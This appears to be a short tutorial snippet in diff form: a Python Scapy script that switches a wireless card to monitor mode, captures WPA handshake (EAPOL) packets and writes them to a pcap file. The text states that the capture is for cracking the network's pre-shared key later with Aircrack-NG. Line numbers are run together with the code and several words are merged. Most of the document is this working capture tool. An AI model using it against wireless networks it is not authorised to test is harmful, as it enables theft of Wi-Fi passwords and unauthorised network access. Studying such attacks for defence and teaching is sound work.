@@ -1,0 +1,5 @@
+Here is a quite rudimentaryscript to sniff the WPA handshake.
+1 #!/usr/bin/python 2 3 from scapy.all import * 4 5 iface = "mon0" 6 wpa_handshake = [] 7 8 def handle_packet(packet): 9 # Got EAPOL KEY packet 10 if packet.haslayer(EAPOL) and packet.type == 2: 11 print packet.summary() 12 wpa_handshake.append(packet) 13 14 # Got complete handshake? Dump it to pcap file 15 if len(wpa_handshake) >= 4: 16 wrpcap("wpa_handshake.pcap", wpa_handshake) 17 18 19 # Set device into monitor mode 20 os.system("iwconfig " + iface + " mode monitor") 21 22 # Start sniffing 23 print "Sniffing on interface " + iface 24 sniff(iface=iface, prn=handle_packet)
+
+
+The script does not pay attention if all four packets are read or if the packets are fromdifferentclients. It should just demonstratehow it is possible to read the WPA handshakewith Scapy andsave it in PCAP formatso onecan crackthe Pre-SharedKeys later with the help of Aircrack-NG
